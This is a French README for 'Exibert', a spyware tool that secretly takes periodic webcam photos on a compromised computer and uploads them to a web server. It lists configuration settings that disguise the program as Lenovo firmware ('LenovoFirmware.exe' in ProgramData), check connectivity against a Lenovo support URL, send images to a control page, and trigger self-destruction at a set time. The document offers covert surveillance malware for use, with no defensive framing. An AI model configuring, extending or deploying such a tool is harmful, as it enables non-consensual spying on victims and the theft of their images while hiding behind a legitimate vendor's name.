# Exibert

[](./exibert_icon.jpg)

Exibert permet de prendre régulièrement plusieurs photos de la webcam d'un ordinateur préalablement piégé et d'envoyer ces dernières sur un serveur web.

#### Configuration 

Dans le fichier `global.cpp` plusieurs paramètres sont disponibles :

 - `float GLOBAL_expirationTimestamp = 1560616327000;` Temps UNIX qui
   déclenche l'autodestruction du programme.
- `QString GLOBAL_nameInstallPath = "Lenovo";` Nom du sous-répertoire où sera stocké le programme (lui même sera dans ProgramData).
- `String GLOBAL_nameInstallRun = "LenovoFirmware.exe";` Nom du programme.
- `QString GLOBAL_networkTestUrl = "http://support.lenovo.com/us/en/";` URL qui sera testé pour détecter la présence d'une connexion réseau opérationnelle.
- `QString GLOBAL_networkSendUrl = "http://url.ntd/control.php";` URL de la page contrôle qui reçoit les images.
